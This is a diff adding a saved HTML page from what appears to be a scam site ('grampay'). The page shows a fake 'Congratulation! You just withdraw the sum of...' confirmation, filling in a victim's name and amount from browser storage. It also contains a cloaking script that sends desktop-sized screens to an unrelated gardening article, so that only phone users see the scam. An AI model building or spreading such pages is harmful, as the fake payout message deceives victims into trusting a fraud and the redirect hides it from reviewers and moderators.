@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<!-- saved from url=(0051)https://allappsreveiws.com.ng/grampay/congrats.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Collected Details</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Oxygen:wght@300;400;700&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
+
+        * {
+            padding: 0;
+            margin: 0;
+            font-family: "Montserrat", sans-serif;
+        }
+        body {
+            background: #e7e7e7;
+        }
+        .container {
+            width: 87%;
+            background: #ffffff;
+            margin: 0 auto;
+            margin-top: 50px;
+            text-align: center;
+            border-radius: 15px;
+            box-shadow: 5px 10px 10px grey;
+            padding: 20px;
+            margin-top: 30%;
+        }
+
+        .container h2 {
+            font-size: 22px;
+        }
+
+        .container p {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+
+        button {
+            width: 230px;
+            height: 40px;
+            margin: 0 auto;
+            display: block;margin-top: 30%;
+            border: none;
+            border-radius: 14px;
+            background: rgb(103, 156, 103);
+        }
+        a {
+            text-decoration: none;
+            font-size: 18px;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="./successful_files/saved_resource" alt="">
+        <h2>Congratulation!</h2>
+        <p>  <span id="accountName">a</span> You just withdraw the sum of<strong></strong> <span id="amount">1000</span> to your bank account</p>
+
+    </div>
+    <button><a href="https://allappsreveiws.com.ng/grampay/home.html">Go Home!</a></button>
+    <script>
+        document.getElementById('amount').textContent = localStorage.getItem('amount');
+        document.getElementById('accountName').textContent = localStorage.getItem('accountName');
+    </script>
+    <script>
+        // JavaScript to check screen size and redirect
+        window.onload = function() {
+            if (window.innerWidth > 768) { // Change 768 to your desired breakpoint for non-phone screens
+                window.location.href = "https://www.goodhousekeeping.com/home/gardening/advice/g1285/hard-to-kill-plants/"; // Redirect to the desired page for larger screens
+            }
+        };
+    </script>
+
+
+</body></html>
